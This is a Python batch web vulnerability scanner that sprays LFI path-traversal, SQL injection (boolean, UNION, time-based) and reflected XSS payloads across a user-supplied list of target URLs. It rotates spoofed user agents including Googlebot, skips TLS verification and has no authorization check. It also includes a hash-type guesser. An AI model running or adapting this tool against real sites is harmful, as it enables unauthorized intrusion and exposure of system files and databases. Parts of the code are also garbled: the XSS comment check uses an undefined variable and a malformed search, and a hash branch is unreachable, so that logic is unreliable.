#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import time
import os
import random
import re
from urllib.parse import urlparse, urlunparse, parse_qs, urlencode
import sys # For checking python version if needed, though not strictly required by current code

# --- Constants ---
# Output Files
LFI_OUTPUT_FILE = "lfi_vulns.txt"
SQLI_OUTPUT_FILE = "sqli_vulns.txt"
XSS_OUTPUT_FILE = "xss_vulns.txt"

# Payload and Input Files (relative to script location)
PAYLOAD_DIR = "payloads"
LFI_PAYLOAD_FILE = os.path.join(PAYLOAD_DIR, "lfi_payloads.txt")
SQLI_PAYLOAD_FILE = os.path.join(PAYLOAD_DIR, "sql_payloads.txt")
XSS_PAYLOAD_FILE = os.path.join(PAYLOAD_DIR, "xss_payloads.txt")
HASH_SAMPLE_FILE = os.path.join(PAYLOAD_DIR, "hash_samples.txt")
USER_AGENTS_FILE = os.path.join(PAYLOAD_DIR, "user_agents.txt")

# Scanner Settings
DEFAULT_USER_AGENT = "FastBatchScannerUA/1.4"
TIME_BASED_SLEEP_DURATION = 5 # seconds (Payloads should use this value)
TIME_BASED_THRESHOLD = TIME_BASED_SLEEP_DURATION * 0.8 # If response takes >= 80% of sleep time
REQUEST_TIMEOUT = TIME_BASED_SLEEP_DURATION + 7 # Request timeout (e.g., 5 + 7 = 12s)


# --- Global Variables ---
LOADED_USER_AGENTS = [] # Global list to hold user agents

# --- Core Functions ---

def make_request(url, headers=None):
    """
    Makes a GET request with rotated UA.
    Returns: (response object | None, response text chunk | None, duration float)
    """
    global LOADED_USER_AGENTS
    global DEFAULT_USER_AGENT

    # Select User-Agent
    if LOADED_USER_AGENTS:
        selected_ua = random.choice(LOADED_USER_AGENTS)
    else:
        selected_ua = DEFAULT_USER_AGENT # Fallback

    # Prepare headers
    final_headers = {"User-Agent": selected_ua}
    if headers: # Merge custom headers if provided, ensuring our rotated UA is used
        final_headers.update(headers)
        final_headers["User-Agent"] = selected_ua

    start_time = time.time()
    response = None
    response_text = None
    try:
        response = requests.get(
            url,
            headers=final_headers,
            timeout=REQUEST_TIMEOUT,
            verify=False,        # Ignore SSL verification errors
            allow_redirects=False, # Don't follow redirects automatically
            stream=True          # Don't load entire response at once
        )
        # Read a limited chunk to avoid memory issues with large responses (e.g., LFI)
        content_chunk = response.raw.read(1024 * 10, decode_content=True) # Read 10KB max
        response_text = content_chunk.decode('utf-8', errors='ignore') # Decode safely
        response.close() # Ensure connection is closed after reading chunk

    except requests.exceptions.Timeout:
        # Timeout occurred, duration is still relevant for time-based checks
        pass
    except requests.exceptions.RequestException as e:
        # print(f"[-] Request error for {url}: {e}") # Uncomment for verbose debugging
        pass
    except Exception as e:
        # Catch other potential errors during request/read
        # print(f"[-] General error during request for {url}: {e}") # Uncomment for verbose debugging
        pass
    finally:
        # Calculate duration regardless of success or failure
        duration = time.time() - start_time

    return response, response_text, duration

def save_finding(filename, finding_text):
    """Appends a finding to the specified file."""
    try:
        # Use 'a' mode to append, creates file if it doesn't exist
        with open(filename, 'a', encoding='utf-8') as f:
            f.write(f"{finding_text}\n")
    except IOError as e:
        print(f"[-] CRITICAL: Error saving finding to {filename}: {e}")
    except Exception as e:
        print(f"[-] CRITICAL: Unexpected error saving finding: {e}")

# --- Test Functions ---

def test_lfi_payloads(base_url, log):
    """Tests for LFI vulnerabilities using common params and payloads."""
    log(f"[*] Starting LFI scan on {base_url}...")
    if not os.path.exists(LFI_PAYLOAD_FILE):
        log(f"[-] LFI payload file not found: {LFI_PAYLOAD_FILE}. Skipping LFI for this target.")
        return

    # Common indicators (case-insensitive checks where appropriate)
    lfi_indicators = [
        "root:x:0:0:", "\[boot loader\]", "windows\\system32\\drivers\\etc\\hosts", # Windows path case-insensitive
        "servlet-mapping", "db_username", "<?php", "root:.*?:[0-9]*:[0-9]*:",
        "odbcconnection", "javax.servlet", "applicationcontext", "web-inf", # Added more specific indicators
    ]
    # Common parameter names to try for LFI
    common_lfi_params = ["file", "page", "path", "include", "document", "view", "dir", "cat", "folder", "item", "name", "pg"]
    found_lfi_target = False

    try:
        with open(LFI_PAYLOAD_FILE, 'r', encoding='utf-8', errors='ignore') as f:
            payloads = [line.strip() for line in f if line.strip()]

        for lfi_param in common_lfi_params:
            for payload in payloads:
                try:
                    parsed_url = urlparse(base_url)
                    query = parse_qs(parsed_url.query)
                    query[lfi_param] = payload
                    url_parts = list(parsed_url)
                    url_parts[4] = urlencode(query, doseq=True) # Handle multiple params
                    url = urlunparse(url_parts)
                except Exception as e:
                    log(f"[-] Error building LFI URL for {base_url} with payload {payload}: {e}")
                    continue # Skip this payload

                response, response_text, _ = make_request(url) # Duration not needed here

                if response and response_text:
                    response_text_lower = response_text.lower() # Lowercase once for checks
                    for indicator in lfi_indicators:
                        # Use regex for the passwd pattern, simple string contains for others
                        if indicator.startswith("root:") and indicator.endswith(":"):
                            if re.search(indicator, response_text): # Regex check for passwd
                                is_hit = True
                            else: is_hit = False
                        elif indicator.lower() in response_text_lower: # Case-insensitive simple check
                            is_hit = True
                        else:
                            is_hit = False

                        if is_hit:
                            finding = f"[Target: {base_url}] [!] LFI Possible (Indicator: {indicator}) → URL: {url}"
                            log(finding)
                            save_finding(LFI_OUTPUT_FILE, finding)
                            found_lfi_target = True
                            # Break indicator loop once hit for this payload/param combo
                            break
            # Optional: break param loop if found for this target? (for speed)
            # if found_lfi_target: break

    except FileNotFoundError:
         log(f"[-] LFI payload file missing: {LFI_PAYLOAD_FILE}")
    except Exception as e:
        log(f"[-] LFI test error for {base_url}: {e}")

    # if not found_lfi_target: log(f"[*] LFI scan finished for {base_url}. No indicators found.")


def test_sql_payloads(base_url, param_name, log):
    """Tests for SQL injection (Error-based and Time-based)."""
    if not os.path.exists(SQLI_PAYLOAD_FILE):
        return # File missing, logged once during prep

    # Common SQL error patterns (use regex for better matching?)
    sql_error_indicators = ["sql syntax", "syntax error", "unclosed quotation mark", "mysql", "sql server", "oracle", "ora-", "odbc", "invalid input", "pg_"]
    time_based_triggers = ["SLEEP(", "WAITFOR DELAY"] # Case-insensitive check later

    try:
        with open(SQLI_PAYLOAD_FILE, 'r', encoding='utf-8', errors='ignore') as f:
             payloads = [line.strip() for line in f if line.strip()]

        for payload in payloads:
            is_time_based = any(trigger.lower() in payload.lower() for trigger in time_based_triggers)

            try:
                parsed_url = urlparse(base_url)
                query = parse_qs(parsed_url.query)
                query[param_name] = payload
                url_parts = list(parsed_url)
                url_parts[4] = urlencode(query, doseq=True)
                url = urlunparse(url_parts)
            except Exception as e:
                 log(f"[-] Error building SQLi URL for {base_url} / {param_name} with payload {payload}: {e}")
                 continue # Skip this payload

            response, response_text, duration = make_request(url)

            # 1. Check for Error-Based SQLi
            if response and response_text and any(err.lower() in response_text.lower() for err in sql_error_indicators):
                finding = f"[Target: {base_url}] [!] SQLi Possible (Error Based) → Param: {param_name}, Payload: {payload}"
                log(finding)
                save_finding(SQLI_OUTPUT_FILE, finding)
                continue # Found error based, skip time check for this payload

            # 2. Check for Time-Based SQLi
            if is_time_based:
                timed_out_suspiciously = (response is None and duration >= REQUEST_TIMEOUT * 0.95)
                if duration >= TIME_BASED_THRESHOLD or timed_out_suspiciously:
                    finding = f"[Target: {base_url}] [!] SQLi Possible (Time Based: {duration:.2f}s) → Param: {param_name}, Payload: {payload}"
                    log(finding)
                    save_finding(SQLI_OUTPUT_FILE, finding)
                    continue # Found time based

    except FileNotFoundError:
         pass # Already checked existence
    except Exception as e:
        log(f"[-] SQLi test error for {base_url} / {param_name}: {e}")


def test_xss_payloads(base_url, param_name, log):
    """Tests for reflected XSS vulnerabilities."""
    if not os.path.exists(XSS_PAYLOAD_FILE):
        return # File missing, logged once during prep

    try:
        with open(XSS_PAYLOAD_FILE, 'r', encoding='utf-8', errors='ignore') as f:
             payloads = [line.strip() for line in f if line.strip()]
        for payload in payloads:
            try:
                parsed_url = urlparse(base_url)
                query = parse_qs(parsed_url.query)
                query[param_name] = payload
                url_parts = list(parsed_url)
                url_parts[4] = urlencode(query, doseq=True)
                url = urlunparse(url_parts)
            except Exception as e:
                log(f"[-] Error building XSS URL for {base_url} / {param_name} with payload {payload}: {e}")
                continue # Skip this payload

            response, response_text, _ = make_request(url) # Ignore duration

            # Basic check: Payload reflected AND contains critical XSS chars
            if response and response_text and payload in response_text:
                # Ensure it wasn't *completely* neutralized (e.g. fully HTML encoded)
                # And check for active characters
                if any(c in payload for c in '<>"\'()")') and not all(c in '&lt;&gt;&amp;&quot;&#39;' for c in payload):
                     # Basic check for reflection inside simple HTML comments
                     is_in_comment = False
                     try:
                         index = response_text.find(payload)
                         if index != -1:
                             comment_start = response_text.rfind('', index + len(payload))
                             is_in_comment = (comment_start != -1 and (comment_end == -1 or comment_end >= index + len(payload)))
                     except Exception: pass # Ignore errors in comment check

                     if not is_in_comment:
                         finding = f"[Target: {base_url}] [!] XSS Possible (Reflected) → Param: {param_name}, Payload: {payload}"
                         log(finding)
                         save_finding(XSS_OUTPUT_FILE, finding)
                         break # Found XSS for this param, move to next param (for speed)

    except FileNotFoundError:
         pass # Already checked existence
    except Exception as e:
        log(f"[-] XSS test error for {base_url} / {param_name}: {e}")


def detect_hash_type_and_guess(log):
    """Analyzes hashes from a file and guesses the type."""
    log("[*] Analyzing hashes...")
    if not os.path.exists(HASH_SAMPLE_FILE):
        log(f"[-] Hash sample file not found: {HASH_SAMPLE_FILE}. Skipping hash analysis.")
        return
    try:
        with open(HASH_SAMPLE_FILE, 'r', encoding='utf-8', errors='ignore') as f:
            hashes = [line.strip() for line in f if line.strip()]
        if not hashes:
            log("[-] Hash sample file is empty.")
            return

        log(f"[*] Analyzing {len(hashes)} hash(es) from {HASH_SAMPLE_FILE}...")
        for h in hashes:
            log_msg = f"[?] {h[:40]}... → Unknown hash type" # Show more chars for long hashes
            h_lower = h.lower()
            h_len = len(h)

            # Basic length and hex checks first
            is_hex = all(c in '0123456789abcdef' for c in h_lower)
            if is_hex:
                if h_len == 32: log_msg = f"[+] {h} → Possible MD5"
                elif h_len == 40: log_msg = f"[+] {h} → Possible SHA1"
                elif h_len == 64: log_msg = f"[+] {h} → Possible SHA256"
                elif h_len == 56: log_msg = f"[+] {h} → Possible SHA224"
                elif h_len == 96: log_msg = f"[+] {h} → Possible SHA384"
                elif h_len == 128: log_msg = f"[+] {h} → Possible SHA512"
                # Add more hex based? (e.g. NTLM is 32 hex chars like MD5)
                elif h_len == 32 : log_msg = f"[+] {h} → Possible MD5 / NTLM"

            # Format-specific checks
            elif h.startswith(("$2a$", "$2b$", "$2y$")) and h_len >= 59: log_msg = f"[+] {h[:40]}... → Possible bcrypt"
            elif h.startswith("$1$") and h_len > 8: log_msg = f"[+] {h[:40]}... → Possible MD5-Crypt"
            elif h.startswith("$5$") and h_len > 8: log_msg = f"[+] {h[:40]}... → Possible SHA256-Crypt"
            elif h.startswith("$6$") and h_len > 8: log_msg = f"[+] {h[:40]}... → Possible SHA512-Crypt"
            elif ("$argon2id$" in h or "$argon2i$" in h or "$argon2d$" in h) and h_len > 40 : log_msg = f"[+] {h[:40]}... → Possible Argon2"
            elif h.startswith("{SSHA}") and h_len > 8: log_msg = f"[+] {h[:40]}... → Possible SSHA (LDAP)"
            elif h.startswith(("$md5", "$apr1")) and h_len > 8: log_msg = f"[+] {h[:40]}... → Possible MD5-Crypt (Apache)"

            log(log_msg)
    except FileNotFoundError: log(f"[-] Hash sample file missing: {HASH_SAMPLE_FILE}") # Should be caught by prepare_payload_files
    except Exception as e: log(f"[-] Hash analysis error: {e}")
    log("[*] Hash analysis finished.")

# --- Utility ---

def load_user_agents(filepath, default_ua, log):
    """Loads user agents from file, returns list or default."""
    uas = []
    try:
        if os.path.exists(filepath):
            with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                uas = [line.strip() for line in f if line.strip() and not line.startswith('#')]
            if uas:
                log(f"[*] Loaded {len(uas)} user agents from {filepath}")
                return uas
            else:
                log(f"[-] User agent file '{filepath}' is empty. Using default.")
                return [default_ua]
        else:
            log(f"[-] User agent file '{filepath}' not found. Using default.")
            return [default_ua]
    except Exception as e:
        log(f"[-] Error loading user agents from {filepath}: {e}. Using default.")
        return [default_ua]

def prepare_payload_files(log):
    """Checks for payload dir/files and creates dummies if missing."""
    global PAYLOAD_DIR # Use global constant

    if not os.path.exists(PAYLOAD_DIR):
        try:
            os.makedirs(PAYLOAD_DIR)
            log(f"[*] Created payload directory: {PAYLOAD_DIR}")
        except OSError as e:
            log(f"[-] CRITICAL: Failed to create directory {PAYLOAD_DIR}: {e}. Exiting.")
            return False

    # Files to check/create with dummy content
    files_to_check = {
        LFI_PAYLOAD_FILE: "../../../../etc/passwd\n../../../../boot.ini\n../../../../windows/system32/drivers/etc/hosts\nWEB-INF/web.xml\n",
        SQLI_PAYLOAD_FILE: (
            "' OR '1'='1-- \n"
            "\" OR \"1\"=\"1-- \n"
            "' UNION SELECT null, @@version -- \n"
            f"' AND SLEEP({TIME_BASED_SLEEP_DURATION}) -- \n"
            f"1; WAITFOR DELAY '0:0:{TIME_BASED_SLEEP_DURATION}' -- \n"
            f"SELECT pg_sleep({TIME_BASED_SLEEP_DURATION}) -- \n"
            "benchmark(5000000, sha1(1)) -- \n" # CPU intensive - alternative time check
            ),
        XSS_PAYLOAD_FILE: (
            "<script>alert('XSS1')</script>\n"
            "<img src=x onerror=alert('XSS2')>\n"
            "'\"><svg/onload=alert('XSS3')>\n"
            "javascript:alert('XSS4')\n"
            "\" autofocus onfocus=alert('XSS5')//\n" # Event handler based
            "<iframe src=\"javascript:alert('XSS6')\"></iframe>\n" # iframe src
            ),
        HASH_SAMPLE_FILE: (
            "5f4dcc3b5aa765d61d8327deb882cf99\n" # password MD5
            "$2y$10$ExampleHashExampleHashExampleHashExampleHashExampleHashEx\n" # bcrypt placeholder
            "5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8\n" # password SHA1
            "$6$rounds=5000$usesomesillystri$K.9GN.DF./JWDu04Dmy.J8rDB5imQdWYF9.iN.vqPv4hrtQRgRKIAa9ssop./Ld5nEs1x2cFyskcg.7eb/Z1.\n" # SHA512-Crypt
            ),
        USER_AGENTS_FILE: (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36\n"
            "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1\n"
            "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0\n"
            "Googlebot/2.1 (+http://www.google.com/bot.html)\n"
            f"{DEFAULT_USER_AGENT}\n" # Include default in dummy file
            )
    }

    all_files_ok = True
    # Check and create payload files
    for fpath, dummy_content in files_to_check.items():
        if not os.path.exists(fpath):
            try:
                # Ensure parent directory exists before writing
                os.makedirs(os.path.dirname(fpath), exist_ok=True)
                with open(fpath, 'w', encoding='utf-8') as f:
                    f.write(dummy_content)
                log(f"[*] Created dummy file: {fpath}")
            except IOError as e:
                log(f"[-] CRITICAL: Failed to create dummy file {fpath}: {e}")
                all_files_ok = False # Mark failure but continue checking others
            except Exception as e:
                 log(f"[-] CRITICAL: Unexpected error creating dummy file {fpath}: {e}")
                 all_files_ok = False

    # Check if essential payload files exist after attempting creation
    essential_payload_files = [SQLI_PAYLOAD_FILE, XSS_PAYLOAD_FILE, LFI_PAYLOAD_FILE, USER_AGENTS_FILE]
    for fpath in essential_payload_files:
        if not os.path.exists(fpath):
            log(f"[-] WARNING: Essential payload file missing and could not be created: {fpath}")
            # Don't set all_files_ok to False here if UA file missing, as it has a default
            if fpath != USER_AGENTS_FILE:
                 all_files_ok = False

    # Check output files can be written (create empty ones)
    output_files = [LFI_OUTPUT_FILE, SQLI_OUTPUT_FILE, XSS_OUTPUT_FILE]
    for fpath in output_files:
        try:
            # Open in append mode to create if not exists, without clearing if it does
            with open(fpath, 'a', encoding='utf-8'):
                pass
        except IOError as e:
             log(f"[-] CRITICAL: Cannot write to output file {fpath}: {e}")
             all_files_ok = False # Cannot save findings
        except Exception as e:
             log(f"[-] CRITICAL: Unexpected error accessing output file {fpath}: {e}")
             all_files_ok = False

    return all_files_ok

# --- Main Execution ---

def run_tests():
    """Gets target list file and runs scans, saving LFI, SQLi, XSS hits."""
    # Simple logger
    def log(msg): print(msg)
    global LOADED_USER_AGENTS # Need access to modify the global list

    log("--- Fast Batch Vulnerability Scanner w/ UA Rotation ---")
    log(f"Payloads directory: '{PAYLOAD_DIR}'")
    log(f"Findings saved to: {LFI_OUTPUT_FILE}, {SQLI_OUTPUT_FILE}, {XSS_OUTPUT_FILE}")
    log("-" * 30)

    # Prepare directories and dummy files if needed
    if not prepare_payload_files(log):
        log("[-] Errors preparing payload/output files. Cannot continue reliably. Exiting.")
        sys.exit(1) # Exit with error code

    # Load User Agents (after prepare_payload_files ensures the dummy exists if needed)
    LOADED_USER_AGENTS = load_user_agents(USER_AGENTS_FILE, DEFAULT_USER_AGENT, log)
    log("-" * 30)

    # Get Target File
    target_list_file = input("Enter filename containing list of target URLs (one per line): ").strip()
    if not target_list_file:
        log("[-] No target file provided. Exiting.")
        sys.exit(1)

    # Read Target URLs
    target_urls = []
    try:
        # Read with encoding tolerance
        with open(target_list_file, 'r', encoding='utf-8', errors='ignore') as f:
            target_urls = [line.strip() for line in f if line.strip() and not line.startswith('#')]

        if not target_urls:
            log(f"[-] Target file '{target_list_file}' is empty or contains no valid URLs (after cleaning). Exiting.")
            sys.exit(1)
        log(f"[*] Loaded {len(target_urls)} target(s) from {target_list_file}")
    except FileNotFoundError:
        log(f"[-] Target file not found: {target_list_file}. Exiting.")
        sys.exit(1)
    except Exception as e:
        log(f"[-] Error reading target file {target_list_file}: {e}. Exiting.")
        sys.exit(1)

    # Get Parameters for tests
    sqli_params_str = input("Parameter name(s) for SQLi (comma-separated, e.g., id,user): ").strip()
    xss_params_str = input("Parameter name(s) for XSS (comma-separated, e.g., query,search): ").strip()
    log("-" * 30)

    # Start Scan Execution
    start_time = time.time()
    total_targets = len(target_urls)
    log(f"[*] Starting scans on {total_targets} target(s)...")

    for i, base_url in enumerate(target_urls):
        # Basic URL validation before scanning
        if not (base_url.startswith('http://') or base_url.startswith('https://')):
            log(f"[!] Skipping invalid URL (missing http/https): {base_url}")
            continue

        log(f"[*] Scanning Target {i+1}/{total_targets}: {base_url}")

        # Run tests for the current target URL
        test_lfi_payloads(base_url, log)

        if sqli_params_str:
            for param in sqli_params_str.split(','):
                param = param.strip()
                if param: test_sql_payloads(base_url, param, log)
        else: log(f"  [-] Skipping SQLi for {base_url} (no params specified).")

        if xss_params_str:
            for param in xss_params_str.split(','):
                 param = param.strip()
                 if param: test_xss_payloads(base_url, param, log)
        else: log(f"  [-] Skipping XSS for {base_url} (no params specified).")

        log(f"[*] Finished scanning {base_url}")
        log("-" * 15) # Separator between targets


    # Run Hash Analysis (once after all web scans)
    detect_hash_type_and_guess(log)

    # End Scan Execution
    end_time = time.time()
    log("-" * 30)
    log(f"[*] All scans finished in {end_time - start_time:.2f} seconds.")

    # Report findings summary
    output_files_found = {
        "LFI": LFI_OUTPUT_FILE,
        "SQLi": SQLI_OUTPUT_FILE,
        "XSS": XSS_OUTPUT_FILE
    }
    found_any = False
    for vuln_type, fpath in output_files_found.items():
        try:
            if os.path.exists(fpath) and os.path.getsize(fpath) > 0:
                log(f"[!] Check '{fpath}' for potential {vuln_type} findings.")
                found_any = True
        except OSError:
             log(f"[-] Could not check status of output file: {fpath}")

    if not found_any:
         log("[*] No potential LFI, SQLi, or XSS findings were saved.")


if __name__ == "__main__":
    # Disable warnings for insecure HTTPS requests (verify=False)
    # Use cautiously, especially outside controlled test environments.
    try:
        import urllib3
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    except ImportError:
        # Handle case where urllib3 might not be directly available via requests' vendored version
        try:
             requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
        except AttributeError:
             print("[-] Could not disable InsecureRequestWarning.", file=sys.stderr)


    # --- Run the main function ---
    run_tests()
    # --- Exit ---
    sys.exit(0)
